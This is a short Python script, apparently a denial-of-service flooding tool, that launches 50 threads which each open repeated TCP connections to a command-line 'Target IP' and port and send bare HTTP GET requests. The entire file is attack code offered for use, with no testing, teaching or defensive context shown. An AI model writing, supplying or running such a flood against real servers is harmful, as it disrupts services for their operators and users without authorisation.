import socket
import threading
import argparse
import sys

def send_packet(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip, int(port)))
            s.send(b"GET / HTTP/1.1\r\n\r\n")
            s.close()
        except:
            break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="Target IP")
    parser.add_argument("port", help="Target Port")
    args = parser.parse_args()

    print(f"Targeting {args.ip}:{args.port}")
    for _ in range(50):
        threading.Thread(target=send_packet, args=(args.ip, args.port), daemon=True).start()
    
    # Keep script running
    input("Press Enter to stop.\n")
